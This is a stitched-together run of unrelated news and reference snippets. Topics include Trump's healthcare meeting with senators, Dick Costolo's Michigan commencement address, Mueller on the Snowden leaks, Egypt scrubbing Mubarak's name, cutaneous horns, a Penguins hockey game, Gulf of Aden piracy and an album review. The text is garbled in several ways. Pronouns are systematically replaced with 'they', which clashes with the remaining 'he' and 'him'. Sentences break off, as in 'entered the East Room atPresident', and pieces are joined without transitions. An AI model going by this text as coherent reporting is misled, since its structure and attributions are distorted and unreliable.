Today, at the East Room, Trump called for the meeting with GOP leaders to talk healthcare. At, most Republican senators were already sitting around tables with white table cloths and black bunting. Senate Majority Leader Mitch McConnell was sitting on the far side of the room, mostly keeping to themselves and surveying the scene. Besides McConnell, Senate Republican Conference Chairman John Thune of South Dakota was also present. President Trump and VP Mike Pence entered the East Room atPresident Trump shook hands with some of the senators as they moved around to their seat on the far left of the room. Notably, they were sitting between health care bill holdouts Susan Collins of Maine and Lisa Murkowski of Alaska. "Well, I thought I'd ask you, folks, to come say hello, and we'll discuss healthcare. We have really no choice but to solve this situation. Obamacare is a total disaster," the President said in their opening remarks. "It's melting down as we speak", they continued, "Rates are going up. In fact, it's very interesting, Lisa, that you're sitting next to me because, in Alaska, it was 206 percent -- a 206 percent increase in Alaska. And I used to use Arizona as the standard; that was 116 percent. So it's really a meltdown, and we're going to try and solve the problem." President Trump said that they think that they have "either 52 out of 52, or 50 out of 52" votes needed to pass the bill. "We're getting very close. But for the country, we have to have healthcare. And it can't be Obamacare, which is melting down. The other side is saying all sorts of things before they even knew what the bill was. This will be great if we get it done. And if we don't get it done, it's just going to be something that we're not going to like. And that's okay, and I understand that very well. But I think we have a chance to do something very, very important for the public -- very, very important for the people of our country that we love. So I'll ask the press to leave. I greatly appreciate you folks being here. We love you very much. You're very kind and very understanding. But we will now ask you to leave. Thank you very much, everybody. Thank you." To a shouted question about their views on the legislation, POTUS said that they think that "the Senate bill is going to be great. Thank you, everybody. Thank you. Such an understanding lot."
Let's just say it probably won't be done in 140 characters or fewer.
On May 4, those attending the university-wide commencement ceremony will hear from 1985 alum Dick Costolo, the current chief executive officer of Twitter. Costolo will also receive an honorary Doctor of Laws degree in recognition of their achievements pending approval by the University's Board of Regents.
University President Mary Sue Coleman told The Michigan Daily that Costolo's role in transforming Twitter into a powerful and ubiquitous part of everyday communication had profoundly impacted the way that people interact with one another.
“(His) entrepreneurial drive, being at the leading edge of a revolution in communication, and the impact of Twitter on the world … they deeply understand the ways that this affects people's interactions with each other,” Coleman said. “It's that broad view that caught my attention.”
In an interview Sunday with the Daily, Costolo said they were deeply honored — and surprised — by Coleman's invitation for them to address their alma mater.
“I asked them if they had the wrong number,” Costolo said jokingly.
During their time at the University of Michigan, Costolo was a member of Phi Gamma Delta fraternity — commonly called FIJI — and practiced amateur improvisational comedy. In an unusual move for a graduate with a bachelor's degree in computer science, they then spent time in Chicago trying their luck as a standup comedian before beginning to work on web-based projects in 1996. Costolo founded three companies, the last of which, Feedburner, was sold in 2007 for $100 million to Google, where they worked in various capacities until 2009.
Later in 2009, Twitter hired Costolo as its chief operating officer. A year later, they became its chief executive officer, replacing Evan Williams.
In November, Costolo addressed a full house at Rackham Auditorium, where they shared their experiences in the technology sector and some anecdotes about their personal life. Coleman said during that visit, they talked with them about creating and maintaining a renewed relationship with the University and its students.
“He got rave reviews for their speech,” Coleman said. “I think he's going to be very, very interesting for the student body.”
Costolo said they were born a Michigan man — making the opportunity to speak in the Big House a major life moment for him.
“It's really the single greatest honor I could ever imagine receiving,” Costolo said. “When I grew up as a kid outside of Detroit in Troy, I always wanted to go to Michigan. It was the only university I applied to, and I always knew I wanted to go there.”
While Costolo didn't want to give away too much before commencement, they said their address will focus on their time at the University, how it helped shape them and how they approach problems to this day.
“It will be highly personal and based on my experiences at the University and the way that my education and time at the University of Michigan shaped the path of the kinds of choices that I made in my life and the way I thought about those choices,” they said.
They added that they were encouraged to see the increase in entrepreneurship at the University since their graduation. Entrepreneurship programs and opportunities have blossomed across campus due to the focus of several Central Student Government initiatives and well as organizations such as MPowered and the Zell-Lurie Institute of Entrepreneurial Studies, among others.
“When I graduated from Michigan with my degree in C.S., I was in a group at the University my junior and senior year that was an entrepreneur's group. There were five or six of us at the time,” they said. “It's funny, the University came out the last couple of years to San Francisco with a group of entrepreneurs from the University and it's 200 or 250 people now. It's funny to go back and think of the five or six of us who were really focused on entrepreneurism and starting things and creating things. That's where it really started for me.”
Rackham Dean Janet Weiss, chair of the Honorary Degree Committee, said that while the committee is not involved with the selection of the speaker, they did review Costolo's nomination for an honorary degree. They said the immense amount of interest that they garnered among University staff and students during their November visit influenced their decision.
“There's a lot of accomplishment — a lot of distinction — in what he's accomplished since their days at the University of Michigan,” Weiss said. “We always like to recognize University of Michigan graduates in particular, so that's a plus.”
HONORARY DEGREES TO BE AWARDED
Lisa Connolly, project manager in the Office of the President, helps coordinate the decision-making process for the commencement speaker with the president. They said that the honorary degree award process was one of mutual benefit for the University and the honoree.
“One of the purposes of honorary degrees is to be meaningful on both ends to the recipient and to the University,” Connolly said.
Six other individuals will receive honorary degrees from the University during the commencement proceedings, all pending approval by the University's Board of Regents.
Rosabeth Kanter, a business professor at Harvard University and University of Michigan alum, will deliver the graduate exercises address on May 3 to recipients of graduate degrees. Kanter is a former editor of the Harvard Business Review and has published many books on sustainable enterprise and leadership in business. Kanter will receive a Doctor of Humane Letters.
“She's well known in the business education world because of their prominence,” Coleman said of Kantor. “She's just very admired by folks at the business school here. I'm delighted that it's worked out for them to come.”
Suzanne Farrell, a ballerina who performed in a number of companies throughout the 20th century, will also receive an honorary degree from the University. Farrell is among the most noted American ballerinas in history and also served as a dance instructor later in their career. In 2000, they formed their own ballet company, the Suzanne Farrell Ballet, which is produced at the Kennedy Center in Washington, D.C. They will receive a Doctor of Fine Arts.
A University alum and generous philanthropist, William Brehm, will also be recommended for an honorary degree. Beginning in the 1960s, Brehm served in various capacities in the Department of Defense before co-founding SRA International, an information technology consulting company that primarily focuses on national security. Brehm has donated significantly to the University, most recently providing $8 million to renovate the School of Music, Theatre & Dance's Earl V. Moore Building. They have been nominated for a Doctor of Laws.
“He has been a tremendous philanthropist, not just for the University of Michigan,” Coleman said. “He is also a composer. We have performed some of their music here. It is their wide area of interest, their desire to do good in the world … Their humanity is hard to express because they care so deeply about the areas that they give to.”
Pulitzer prize winning historian and lecturer David McCullough will also be nominated for an honorary degree. McCullough is a prolific author who has written several biographies of American presidents and other historical topics. They have also received the Presidential Medal of Freedom, the highest honor a civilian can earn. They will be recommended for a Doctor of Humane Letters.
Former Democratic Congressman Dale Kildee will be honored at the University of Michigan-Flint. According to Coleman, Kildee was a longtime friend of the University of Michigan and higher education during their 36-year-long career representing Michigan in Congress. Kildee is now in retirement. They will be recommended for a Doctor of Laws.
Award-winning economist Jeffrey Sachs will be honored at the University of Michigan–Dearborn. Sachs is currently a professor at Columbia University and Special Advisor to the United Nation's secretary-general. They have previously served as director of the Millennium Promises Alliance, which focused on international development and extreme poverty eradication. Sachs has also authored several New York Times bestsellers and has been twice named to Time Magazine's list of the world's 100 most influential people. They will be nominated for a Doctor of Science.
In a unique effort to generate excitement about this year's ceremony, the University is encouraging Twitter users to use the hashtag #MGoGrad to follow the conversation about commencement.

Image caption Mueller's testimony came during a flurry of hearings and news conferences in Washington on the leaks
The disclosure last week of a pair of top secret surveillance programmes has caused the US "significant harm", the head of the FBI has said.
Robert Mueller also told Congress the US would hunt down and prosecute leaker Edward Snowden.
Mr Snowden, 29, has admitted disclosing information about National Security Agency (NSA) programmes that seize data from US internet and telephone firms.
US officials have promised their own disclosures about the programmes.
"We want to provide the American people the information," NSA chief Gen Keith Alexander said following a closed-door briefing to members of the House of Representatives intelligence committee.
"But we don't want to risk American lives in doing that," they added.
'Exceptionally vulnerable'
Gen Alexander's remarks came amid a flurry of news conferences and hearings on Thursday as Washington grapples with the fallout from last week's disclosures in the Guardian and Washington Post newspapers.
Analysis The great 2013 national intelligence debate continues. NSA boss Keith Alexander seems anxious that it should and the president says they welcome it, even as the Department of Justice works up its case against Edward Snowden. Senator Mark Udall put it well on Wednesday, saying it was hard to have a transparent debate "about a secret program, written by a secret court, issuing secret court orders, based on secret interpretations of the law". In the anxious aftermath of 9/11, when the Patriot Act was drawn up - and apparently not read by very many people - security trumped openness. Since then, giant technical strides have given the NSA capabilities that lawmakers might only have guessed at a decade ago. Now Gen Alexander wants the public to know what these surveillance capabilities have done, for US and global security, as well as how much more difficult their job would be if the capabilities were taken away again.
Mr Snowden, a former CIA and NSA contract worker, has admitted giving the newspapers information about NSA programmes that seize vast quantities of data from US internet and telephone companies.
In testimony in the House judiciary committee, Mr Mueller said those leaks had caused "significant harm to our nation and to our safety".
The FBI director said the history of US intelligence gathering showed plotters adapt their methods after leaks of classified intelligence material.
"One of my problems is that we're going to... lose our ability to get their communications," Mr Mueller said. "We are going to be exceptionally vulnerable."
In a press conference after the briefing with Gen Alexander, House intelligence committee chairperson Mike Rogers said officials hoped to make public next week the details of terror plots supposedly thwarted by information gained from the programmes.
Mr Rogers, a Michigan Republican, said further disclosures would reassure Americans about the scope of US surveillance efforts, including phone records.
"There are no American names in that lockbox," they said. "There are only numbers in that lockbox."
'Surveillance state'
They added if there were a "reasonable suspicion" that a phone number was tied to a terrorist organisation, it would be turned over to the FBI for further investigation.
Representative Dutch Ruppersberger, the top Democrat on the committee, said at least 10 attacks had been thwarted by the programmes.

Senators leaving a separate closed-door briefing with Gen Alexander also defended the programmes.
Democrat Ben Nelson of Nebraska said: "It is misunderstood that American private information, emails and phone calls are being rummaged through by the government - that is not true.
"Only when there is probable cause given with a court order of a federal judge can they go into the content of phone calls and emails in order to be able to disrupt a terrorist plot."
But despite the defence of the programmes by President Barack Obama and politicians of both parties, some remain sceptical.
Democratic Senators Ron Wyden and Mark Udall said they had seen no evidence NSA programmes had produced "uniquely valuable intelligence".
"Gen Alexander's testimony yesterday suggested that the NSA's bulk phone records collection programme helped thwart 'dozens' of terrorist attacks, but all of the plots that they mentioned appear to have been identified using other collection methods," the senators said in a joint statement.
In the House, Representative John Conyers, the intelligence committee's top Democrat, said they feared the US was "on the verge of becoming a surveillance state".
Given that the once universal billboards bearing Mr. Mubarak's portrait have largely come down, the sudden profusion of their picture held aloft by more than 100 supporters seemed alien.
“The people want the president to be honored!” they yelled, a variation on a popular chant that started in Tunisia and spread around the region, about the people wanting the government to fall.
“The people want the president put on trial!” yelled back an impromptu counterdemonstration that the police kept across the street.

The Mubarak supporters also chanted that they were not being paid to stand there, which only served to strengthen suspicions that they were, as did the uniformity of their statements. Each spouted the same sentence practically verbatim about how the Tahrir demonstrators were only a fraction of Egypt's 85 million or so people.
Some Egyptians decry the attention focused on the issue, calling it superficial given the far more serious problems the country faces, ranging from the direction of the revolution to the brewing economic crisis. Sherif Hafez, a political science professor, for example, argued that removing the name was considerably less important than the more profound task of changing the mentality that allowed one man to dominate the country for nearly 30 years.
Cataloging every public use of the Mubarak name would require an effort not unlike constructing the Pyramids. It was plastered across schools, libraries, hospitals, clinics, bridges, roads, squares, airports, stadiums, ministry buildings, industrial complexes, dormitories, scouting centers and various national prizes. You name it.
The Ministry of Education reported that 549 schools had been named after either the president, their wife, Suzanne, or their son Gamal. The president was the namesake for 388 schools, compared to 314 for the three previous presidents combined.

Some children seeking an excuse to avoid school have hit on a corker — refusing to attend classes in any building bearing the Mubarak name, said one lawyer joining the lawsuit this week, arguing that speed was of the essence.

Naturally, all sorts of government branches and individuals have taken matters into their own hands. Newspapers report countless changes. The governor of Assiut ordered the name of “The Suzanne Mubarak School for Girls” changed to “The January 25th School for Girls.” The president of Zagazig University in the Nile delta ordered the name of the Mubarak University City dormitory complex changed to Tahrir Square. In the port of Damietta, workers protested until the Mubarak Petrochemical Complex was rebranded the Free Industrial Zone.
Gigi Ibrahim was about to inaugurate a free speech program at the American University in Cairo when the name etched in gold across a heavy beige marble plaque hanging outside the hall stopped them in their tracks: H. E. Suzanne Mubarak Conference Hall.
So Ms. Ibrahim, 24, having cut their teeth as a political activist at Tahrir Square, immediately applied the lessons learned about direct action, found a screwdriver and took it down with a friend's help. “When we saw it we thought, ‘Well this just needs to come down,' ” they said, although officially the name holds.

The profusion of Mubarak rooms, photographs and statuary in the National Assembly rivaled that of Julius Caesar in imperial Rome. In fact one marble bust that media reports said cost around $30,000 gives the former president a passing resemblance to the Roman emperor. (One paper referred to it as “sanam,” the Arabic name for false idols worshiped in pre-Islamic days.) They have all been carted off, with the Mubarak room in the currently defunct Assembly chambers renamed Nile Hall.
Nile is one of the popular neutral alternatives to the Mubarak surname. The Culture Ministry, for example, announced that the Mubarak Prize for Social Science, Arts and Literature would become the Nile Prize.
The Martyrs of Jan. 25, or simply Jan. 25, the date of the start of the revolution, is perhaps the most common alternative to Mubarak. The names of the hundreds killed in the protests are also a popular choice.
Subway riders opposed to the Mubarak name have scratched it off on many of the signs inside the cars, and play a cat-and-mouse game with the workers at the Mubarak Station beneath Ramses Square, Cairo's main railroad terminal. Every time they plaster an alternative name — Jan. 25 Martyrs — across the Mubarak signs, subway cleaners remove it.
They are hardly the only government workers who still revere the former president.
When Mohamed al-Sayed, a labor leader at an aluminum factory, was hauled in by military interrogators about organizing strikes at the plant, they were surprised to find Mr. Mubarak's framed portrait still hanging on the wall.

One army officer told Mr. Sayed that Mr. Mubarak remained the supreme commander of the armed forces. (Although the president handed over the running of the country to a military council, the lack of any known letter of resignation means they might technically remain the head of state.)
“I refused to answer questions until the picture came down,” Mr. Sayed recounted, at which point the officers laughed at them and said they would have to wait until there was another president.
Those who support making Egypt Mubarak-free wonder how far they can take the effort. Mohamed Safi, a radio disc jockey, said they were considering initiating a campaign to stop using the standard Egyptian holiday greeting from “Id Mubarak” or “Blessed Feast” to the equally serviceable “Id Said” or “Happy Feast.”
But behind the scrubbing of the name, they said, lay a serious warning for future leaders: “It sends the message that you are not immortal, that unless you do something really good for the people, we are not going to slap your name up everywhere.”

Cutaneous horn Actinic keratosis with cutaneous horn
Cutaneous horns, also known by the Latin name cornu cutaneum, are unusual keratinous skin tumors with the appearance of horns, or sometimes of wood or coral. Formally, this is a clinical diagnosis for a "conical projection above the surface of the skin."[1] They are usually small and localized, but can, in very rare cases be much larger. Although often benign, they can also be malignant or premalignant.[2]
Signs and symptoms [ edit ]
The lesion at the base of the keratin mound is benign in the majority of cases. Malignancy is present in up to 20% of cases, with squamous cell carcinoma being the most common type. The incidence of squamous cell carcinoma increases to 37% when the cutaneous horn is present on the penis.[3] Tenderness at the base of the lesion is often a clue to the presence of a possible underlying squamous cell carcinoma.[citation needed]
Cutaneous horn in right ear
Cause [ edit ]
The cause of cutaneous horns is still unknown, but it is believed that exposure to radiation can trigger the condition. This is evidenced by a higher rate of cases occurring on the face and hands, areas that are often exposed to sunlight. Other cases have reported cutaneous horns arising from burn scars.[4] As with many other wart-like skin conditions, a link to the HPV virus family, especially the HPV-2 subtype has been suggested.[5]
Diagnosis [ edit ]
Cutaneous horn usually arises due to an underlying epidermal lesion, the most common being verruca vulgaris (wart), actinic keratosis (a potentially pre-malignant lesion of dysplastic keratinocytes), or squamous cell carcinoma (a form of skin cancer). These can look essentially identical clinically. The only reliable way to diagnose which type of lesion is present under the horn is to biopsy the lesion and have it microscopically examined by a pathologist (or dermatologist).
Treatments [ edit ]
As the horn is composed of keratin, the same material found in fingernails, the horn can usually be removed with a sterile razor.[citation needed]However, the underlying condition will still need to be treated. Treatments vary, but they can include surgery, radiation therapy, and chemotherapy.
Notable cases [ edit ]
Zhang Ruifang, aged 101 (living in Linlou Village, Henan province, China), has grown a cutaneous horn on their forehead, resembling what those who have examined them and their family call "Devil's Horns." Notably, this growth has expanded to reach a total of 6 centimeters in length. Another is forming on the opposite side of their forehead. [6]
Notably, this growth has expanded to reach a total of 6 centimeters in length. Another is forming on the opposite side of their forehead. Liang Xiuzhen, aged 87 (living in Guiyan village in Ziyang City, Sichuan province, China) grew a 13 cm (5.1") pointed horn from their forehead, earning them the nickname "Unicorn Woman". [7]
Huang Yuanfan, aged 84 (living in Ziyuan, China). [8]
Madame Dimanche, called Widow Sunday, a French woman living in Paris in the early 19th century, grew a 24.9 cm (9.8") horn from their forehead in six years from the age of 76 before it was successfully removed by French surgeon Br. Joseph Souberbeille (1754–1846). A wax model of their head is on display at the Mütter Museum, The College of Physicians of Philadelphia, US.[9]
The Shope papilloma virus can cause rabbits to grow horns. This may have been the source of myths such as the Wolpertinger and the Jackalope.

Pune: City-based activists have blamed Maharashtra State Electricity Distribution Company Limited's (MSEDCL) inefficiency and poor planning for its recent statement that the power utility has implemented temporary load-shedding across the state as it is facing unavailability of coal.
The state power utility on Monday released a statement that due to problems with availability and supply of coal to electricity producing plants, a temporary load-shedding is being carried across the state.
“Maharashtra State Power Generation Company (MAHAGENCO) is supposed to provide 7,000 MW of power while Adani Power Company is supposed to generate 4,500 MW for distribution. But due to problems with unavailability of coal, MAHAGENCO is supplying only 4,500 MW of power while Adani is supplying only 1,700-2,000 MW of power," a MSEDCL official said.
The officials added that MSEDCL is making efforts to increase power availability and 395 MW has been purchased from the market which would be available in the coming two days.They stated that efforts are also being made to buy power from the power exchange.
Meanwhile, city-based civic activist Vivek Velankar said that the reason of unavailability of coal for shortage of power put forth by MSEDCL is questionable. They asked that even if there is coal shortage whose responsibility it was to ensure sufficient supply to the plants.“At a time when power demand from agriculture sectors, industries and even residential users is not very high, load-shedding by MSEDCL seems unnecessary and the real reasons for the same seem to be hidden,” they said.
Maharashtra Veej Grahak Sanghatana president Pratap Hogade said, “MSEDCL had told Maharashtra Electricity Regulatory Commission (MERC) that they have 30,255 MW of power during May. Yet, there was load-shedding in loss making regions in May similar to what is being done now when the demand was just little above 19,000 MW.”
They said that the real reasons for load-shedding are lack of efficiency and lack of planning by MSEDCL and MAHAGENCO which must be addressed.
Hogade stated that the capacity charges paid by consumers should be returned for the period of load-shedding as consumers should not face the burnt of problems like unavailability of coal which they are not responsible for.

PITTSBURGH -- The Pittsburgh Penguins have spent the majority of the Sidney Crosby era treating the regular season as an 82-game exhibition until the playoffs start.
Not this year. Not by a long shot.
John Tavares broke a tie with their 37th goal of the season early in the third period and the New York Islanders pulled away to beat the reeling Penguins 3-1 on Friday night. Pittsburgh has lost five straight but can still claw into the postseason through a series of scenarios, the easiest coming with a win over lowly Buffalo on Saturday night.
"That's why we play 82 games to see who [are] the best teams after that,'' Penguins forward Patric Hornqvist said. "Tomorrow is a hell of a game, and everybody is excited. Live or die. Can't wait." There are no such issues for the Islanders. New York clinched a spot Thursday and assured itself of at least third place in the Metropolitan Division. The Islanders can earn home ice in the first round with a win over Columbus on Saturday and a Washington loss to the New York Rangers.
Jaroslav Halak recovered from a horrific meltdown in a loss to Philadelphia on Tuesday night -- when they allowed the winning goal on a knuckling wrist shot from 50 feet with two seconds left in regulation -- by stopping 37 shots. Michael Grabner and Casey Cizikas also scored for the Islanders.
"They had a desperate team tonight, and they were throwing everything at the net," Grabner said. "And [Halak] stood on their head. But he's been doing that all year for us and the last game, it was just bad luck. We put that behind us."
Pittsburgh appeared to grab momentum when Rob Scuderi banged home a shot from the left circle with just 5.7 seconds to go in the second to tie the game. The defenseman's first goal in more than two years evened things, but not for long. Tavares had little trouble flipping a rebound by Marc-Andre Fleury 2:46 into the third. Grabner added their eighth goal with less than four minutes remaining, and Halak took care of the rest.
"I needed to be better," Halak said. "Especially with giving up a late goal [on Tuesday] like that."
No matter what happens in the final regular-season game ever at Nassau Coliseum on Saturday, the Islanders will at least get two more games in their outdated rink before moving to Brooklyn next season.
There may be no more home games for Pittsburgh, at least this season. It's a scenario that seemed far-fetched a month ago before a 3-9-2 spiral that has left the Penguins scrambling. Fleury, voted Pittsburgh's MVP by their teammates earlier in the day, made 23 stops but the Penguins continued to struggle to score. Pittsburgh has 11 goals in its past seven home games.
"We were all around the net, generating some good chances, getting a lot of pucks at the net, competed hard in the corners, all the things you need to do to generate goals," Crosby said. "You have to trust that it's going to go in."'
The Penguins blew an early three-goal lead in an overtime loss to Ottawa on Tuesday night but responded with perhaps their best stretch of play in a long time early against the Islanders.
Hornqvist nearly put Pittsburgh up 7:52 into the game when they tried to jam the puck by Halak. The goalie snatched the puck with their glove, which just happened to be behind the goal line when play was stopped. It was ruled no goal on the ice and upheld on review. The 375th consecutive sellout crowd at Consol Energy Center hadn't finished voicing its displeasure when Cizikas found themselves racing the other way and firing a wrist shot by Fleury for New York's 10th short-handed goal of the season, tied with Winnipeg for the NHL lead.
Halak's brilliance continued into the second. They stuck their left toe in front of Crosby's backhander to keep the Penguins off the board, and Pittsburgh appeared headed for the third period down a goal, not the best position for a team that hasn't won a game when trailing after two periods all season.
The equalizer came from an unlikely source, though Scuderi's first goal since Jan. 19, 2013, resulted from a peerless shift by Crosby that ended with Crosby's rebound off a Paul Martin shot sliding across the ice to Scuderi. The 36-year-old's 100th career point smacked off Halak's right hand and into the net with just 5.7 seconds left in the period.
It just wasn't enough to stop a tailspin that could have Pittsburgh out of the playoffs for the first time since 2006.
NOTES: Tavares and Crosby both have 84 points, tied for the NHL lead. ... The Penguins dressed five defensemen and 13 forwards, though forward Craig Adams played only on the penalty kill. ... Islanders D Travis Hominic left after the first period with an undisclosed injury and did not return. ... New York improved to 21-6-2 against the Metropolitan Division. The Penguins are 9-17-4 against divisional opponents.

The broader culture has undoubtedly influenced the increased questioning among American Jews about circumcision.
Since 1979, the national rate went down 10 percent overall (or 6 percentage points, to 58 percent). The region with the steepest drop by far was the West, where the overall percentage of newborns circumcised went down 37 percent, to 40 percent.
Especially in the Northeast and Midwest, circumcision has been the mainstream American thing to do. American Jews didn't have to consider as a factor the possibility that their sons would stand out.
While it's unclear if the rates will drop further, or rise, the mere possibility raises the question: Would this highly assimilate group of Americans, who in high numbers reject other barometers of religiosity like synagogue membership and belief in God, continue circumcising if they knew it would make their sons look different?
“I'd bet my house on this: As America goes, so will circumcision. If America starts turning against this, give it one generation,” said Shira Stutman, rabbi at the millennial-focused D.C. synagogue, Sixth & I.
Ben Rempell, a 35-year-old government contractor who felt adamant about circumcising their two sons, said they couldn't say for sure if their calculus would be different if Jews were the only ones to circumcise.
“Maybe,” said Rempell, who moved overseas from the U Street area a few years ago. “If there was enough knowledge to know he'd feel really uncomfortable and if it were to affect their growth and development as a person I might consider not doing it.”
Tradition, culture and health trends factor into decisions around the world about whether to circumcise. While circumcision is becoming more common in some countries, including Africa, it is becoming less so in Europe, where lawmakers in some countries have unsuccessfully pushed to ban the practice. It isn't common in South America or parts of Asia, from where many new Americans come.
It's unclear what will happen with global circumcision rates. Muslims worldwide also circumcise, and experts on American Islam say there is no questioning of the practice among Muslims here.
Rabbis know the practice is being questioned in an unprecedented way, and are using a wider range of arguments to support it.
Rabbi Julie Pelc Adler, head of the circumcision, or brit milah, program for Reform Judaism, frames circumcision as a way to remember the power of procreation. “The point isn't to curb sexual enjoyment but to remind them to use it with love and not hate,” Adler said.
Even the Web site of Chabad, a major movement of Orthodox Jews, characterizes circumcision as a “human act. This teaches us that our spiritual, emotional, moral and ethical perfection requires human effort. God cannot do it for us.”
China sent three navy ships to the Gulf of Aden to protect shipping Ships from two navies in the Gulf of Aden have thwarted separate pirate attacks on two merchant vessels. A Chinese navy helicopter drove off a number of small pirate boats closing in on an Italian-owned ship, China's state-run Xinhua news agency reports. And a Danish warship answered an alert from a Chinese cargo ship under attack and seized a pirate skiff and weapons, the US navy says. There has been a surge in pirate attacks off Somalia this year. A helicopter from one of the Chinese vessels spotted pirates close to the cargo ship and fired flares to warn them off, Xinhua said. China sent three ships to help patrol the Gulf of Aden - a crucial shipping lane connecting Europe and Asia - late last year. It is the second successful rescue for the squadron. In January, a Chinese destroyer saved a Greek ship from attack. Evasive action In the other rescue, the Danish ship, the Absalon, "closed on the co-ordinates given by the Chinese ship following their distress call and spotted a skiff matching the description given by the captain of the motor vessel", a statement from the US Naval Forces Central Command, based in Bahrain, said. The crew on the Chinese ship, MV Yandanghai, had prevented the pirates from boarding by taking evasive manoeuvres and training their fire hoses on their skiff. When the Danes arrived, they boarded the skiff and found several weapons, including a rocket-propelled grenade (RPG), four AK-47 assault rifles, two grenades and a knife, the US navy said. Two of the Yandanghai's crew were reported to be lightly injured in the attack. The International Maritime Bureau's piracy reporting centre says that 2008 saw a record number of pirate attacks globally. The waters off Somalia accounted for nearly 40% of the 293 attacks reported. Vessels seized included a Saudi oil tanker and a Ukrainian ship transporting weapons, including tanks. Both were released after ransoms were paid. The attacks have continued this year. On Sunday the Greek-owned cargo ship MV Saldanha was seized by pirates in the Gulf of Aden. Warships from more than a dozen nations, including the UK, the US, France, Germany and Iran are now patrolling the Gulf of Aden in an attempt to deter the pirates.

0 Driver shot at busy Cobb County intersection
VININGS, Ga. - Cobb County police are searching for the driver who shot another driver in Vinings Thursday morning.
Lakishia Lindsey says they were driving to work when the driver of a dark colored Saturn SUV cut them off on Cumberland Parkway and began gesturing at them
"We get to the light. They flick me off, rolls down their window, they turn onto Paces Ferry Road," Lindsey said.
Lindsey says the driver of a white pickup truck started yelling at the reckless driver to stop. The reckless driver then turned their rage towards the driver of the white pickup truck.
"When they pulled onto Paces Ferry, they pull out a gun and shoots the guy. I'm just like, I kind of owe that guy my life, because it could have been me," Lindsey said.
Witness Jean Phillipe Gibson saw the incident unfold. As the shooter fled the scene in their dark SUV with no license tags, Gibson jumped out to help the victim in the pickup truck.
"He just said it was unbelievable. They kept repeating it was unbelievable," Gibson said, "He was obviously in shock, because you don't expect to get shot on the side of the road."
The victim was shot in the hip and was taken to a local hospital.
Lindsey says they are working to locate the man and tell them thank you. They also hope police catch the shooter before they strike again.
"Very important, because who knows who else they could do this to, and then this time, you know, it was a minor situation where it looks like this guy will survive, but who knows what he'll do next," Lindsey said.
Drivers said the SUV was seen headed toward the city of Atlanta.

Hyperlite Mountain Gear (HMG) has just introduced two new backpacks for ice climbing and mountaineering called the Ice Pack and the Porter. They are made using an ultralight non-woven fabric called Cuben Fiber.
Originally developed to make World Cup racing boat sails, Cuban Fiber's durability and light weight make it a natural choice for ultralight backpacks and tarps.
"We're getting a lot of great feedback about these packs from sponsored climbers and expedition guides," said HMG's founder and CEO, Mike St. Pierre. "They also cost much less than other lightweight ice-climbing and mountaineering packs, which are two or three times as expensive."
The Ice Pack is designed for ice climbers. Weighing in at 26.5 ounces, it has a capacity of 2,400 cubic inches and features dual ice axe holders, an exterior crampon attachment system, and hip belt loops for racking climbing gear.
The higher-capacity Porter is a general purpose mountaineering pack, weighing 25.1 ounces, with a capacity of 3,400 cubic inches. The Porter features a double-reinforced bottom and a three-tier compression system that can be used to attach skis, snowshoes or a sleeping pad to the outside of the pack.
Made in the United States and priced at $255 and $275, the Ice Pack and Porter backpacks are available in four torso sizes, ranging from 15 inches to 21+ inches, and with three different hip belts, to accommodate waist sizes from petite to burly.
Both packs have external daisy chains, haul loops, numerous attachment points, and accessories for trip-specific customization.
St Pierre, an avid hiker, backpacker, and ice climber, founded Hyperlite Mountain Gear two and a half years ago. "Before we sold any products, we spent a year on product design and testing to make sure that our gear was extremely durable," they said. "In the process, we developed a proprietary ripstop Cuben Fiber/nylon hybrid that makes our backpacks much more abrasion resistant."
"If you look at the inside of an HMG pack, you'll see that the pack and its back panel are cut from one sheet of Cuben Fiber which is taped together, making it virtually waterproof," said St. Pierre. Some stitching is still required, but HMG's proprietary Cuben Fiber material helps facilitate that process, according to St. Pierre, making it much faster to manufacture the packs and keep up with customer demand.
Review: Agalloch, 'The Serpent & The Sphere'

It's been four years since Agalloch released Marrow of the Spirit, a spectacular record that exposed the cultish metal band to a wider audience seeking something ritualistic and caustic in heavy music. For all of its lengthy and textured songs, Marrow kept things fairly linear — thrilling in its momentum, for sure, but onward and forward. Maybe that's why Agalloch's fifth album, The Serpent & The Sphere, feels like a film shot out of sequence, with "Eureka!" moments hidden throughout and, more often, much after the fact.
Case in point: "Birth and Death of the Pillars of Creation," the proggy, funeral-paced opener. This thing is densely immense, which is a ridiculous way to say that, right off, The Serpent wants to slowly swallow you whole. When guitarist John Haughm's ghostly rasp finally appears four minutes in, we've already been treated to gracefully massive doom-metal, the Mellotron's choral and string settings, and a stately strummed acoustic guitar. But if Marrow, in particular, taught Agalloch anything, it's how to breathe: Six minutes in, the swarm subsides and bassist Jason William Walton and drummer Aesop Dekker translate the melody into something downright Baroque. Producer Billy Anderson (Sleep, Neurosis) applies light production detail, but that subtle reverb on the drums explodes upon re-entry when the full band comes back in.
It's a curious set-up for what follows: one of three total acoustic interludes written and performed by Musk Ox's Nathanaël Larochette, then what might be band's best 1-2-3 shot since The Mantle. Agalloch has never really been one to swing the beat — maypole dance around "The Lodge," perhaps? — but between blast beats, Dekker gives "The Astral Dialogue" a Bill Ward bounce. It's also one of the most straightforwardly black-metal ragers Agalloch has recorded, featuring Don Anderson's most skillful guitar work yet; it blends acoustic and electric passages with ease. There's really no one like Anderson in metal right now, adept to blaze through riffs one second and counter their own perfectly crafted melodies the next. That compositional proficiency could come off as processed, but they make it all sound handmade.
"Dark Matter Gods" and "Celestial Effigy" follow with subtle nods to the past, particularly 1999's Pale Folklore. Agalloch was a different band back then, diving blindly into a folk-driven black-metal concept that had few precedents. But here, Cure-like atmospherics and rolling, pagan-folk-inspired percussion have never sounded so full and determined. Since joining in 2007, Dekker continues to be Agalloch's most sympathetic asset, aware of the band's rich discography while committing to some of their most musical drumming to date.
The Serpent & The Sphere is yet another metallic masterpiece from Agalloch. Even though frontman John Haughm says they have a "neurotic dissatisfaction with everything I do," the album feels like an abstract meditation on nearly 20 fascinating years without directly looking back.
Now here's a thorny etiquette issue, worthy of Debrett's: when is it acceptable to abandon your dining companions to accompany a stranger to a bar? Before you say “never”, would your answer be different if the stranger was Joanna Lumley, Keith Richards or the late Brian Clough? Would you not feel this was your sole chance of spending time with a living legend? Shouldn't friends gracefully release you from the usual courtesies, rather like some couples agree to suspend vows of fidelity if George Clooney or Scarlett Johansson drops round?
